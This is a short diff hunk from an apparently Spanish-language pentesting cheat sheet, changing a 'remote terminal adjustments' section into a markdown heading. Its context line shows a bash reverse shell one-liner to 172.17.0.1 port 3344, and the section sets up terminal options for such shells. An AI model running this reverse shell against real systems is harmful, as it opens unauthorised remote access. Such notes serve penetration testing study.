@@ -119,7 +119,7 @@ bash -c "bash -i >& /dev/tcp/172.17.0.1/3344 0>&1"
 
 ---
 
-🎨 Ajustes de Terminal Remota
+### 🎨 Ajustes de Terminal Remota
 Configura el entorno de shell para una mejor compatibilidad y apariencia al conectarse por SSH o shells limitadas.
 ```
 export TERM=xterm-256color
